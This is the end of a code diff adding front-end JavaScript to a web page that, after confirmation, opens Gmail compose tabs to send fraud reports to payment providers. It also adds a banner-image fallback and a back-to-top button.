+      data.emails.forEach(function (e) {
+        all.push({ pay: data.name, email: e });
+      });
+    });
+
+    var listHtml = '<ul>' + all.map(function (x) {
+      return '<li>' + x.pay + ' · ' + x.email + '</li>';
+    }).join('') + '</ul>';
+
+    openModal(
+      'Kirim laporan ke <b>semua payment</b>?<br><br>' +
+      'Alamat tujuan:<br>' + listHtml +
+      '<br><span style="color:#8a8a8a">' + all.length + ' tab Gmail akan dibuka.</span>',
+      function () {
+        setLoading(btnAll, true);
+        setStatus('OPENING ' + all.length + ' TABS');
+
+        var i = 0;
+        function next() {
+          if (i >= all.length) {
+            setLoading(btnAll, false);
+            setStatus('READY');
+            toast('success', 'Semua tab Gmail dibuka (' + all.length + ').');
+            return;
+          }
+          var x = all[i++];
+          var text = buildMessage(templateSel.value, phoneInput.value, x.pay);
+          openGmail(x.email, 'Laporan Penipuan ' + x.pay, text);
+          toast('info', 'Tab: ' + x.pay + ' · ' + x.email);
+          setTimeout(next, 800);
+        }
+        next();
+      }
+    );
+  });
+
+  /* =========================================================
+     BANNER FALLBACK
+     ========================================================= */
+  (function () {
+    var banner = document.getElementById('banner');
+    var img = document.getElementById('bannerImg');
+    var fallback = document.querySelector('.fallback-text');
+    if (!banner || !img || !fallback) return;
+    function fail() { 
+      img.style.display = 'none'; 
+      fallback.style.display = 'block'; 
+    }
+    img.addEventListener('error', fail);
+    if (img.complete && img.naturalWidth === 0) fail();
+  })();
+
+  /* =========================================================
+     BACK TO TOP
+     ========================================================= */
+  var totop = document.getElementById('totop');
+  window.addEventListener('scroll', function () {
+    var y = window.scrollY || window.pageYOffset;
+    if (y > 400) totop.classList.add('show');
+    else totop.classList.remove('show');
+  }, { passive: true });
+  totop.addEventListener('click', function () {
+    window.scrollTo({ top: 0, behavior: reduced ? 'auto' : 'smooth' });
+  });
+
+})();
+</script>
+</body>
+</html>
